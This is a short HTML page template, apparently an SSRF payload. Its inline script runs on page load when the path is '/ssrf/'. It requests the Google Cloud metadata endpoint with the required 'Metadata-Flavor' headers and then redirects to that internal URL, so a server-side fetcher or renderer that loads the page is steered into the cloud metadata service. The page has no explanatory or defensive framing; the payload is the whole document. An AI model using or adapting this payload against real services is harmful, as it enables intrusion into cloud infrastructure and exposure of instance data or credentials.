<!DOCTYPE html>
<html>
<head>
    <title>Your Website Title</title>
    <!-- other head elements -->
</head>
<body>
    <!-- your website's body content -->

    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            if (window.location.pathname === '/ssrf/') {
                fetch('http://metadata/computeMetadata/v1/instance/id', {
                    method: 'GET',
                    headers: {
                        'Metadata-Flavor': 'Google',
                        'X-Google-Metadata-Request': 'True'
                    }
                })
                .then(response => {
                    // Handle the response if needed
                    window.location.href = 'http://metadata/computeMetadata/v1/instance/id'; // Redirect
                })
                .catch(error => console.error('Error:', error));
            }
        });
    </script>
</body>
</html>
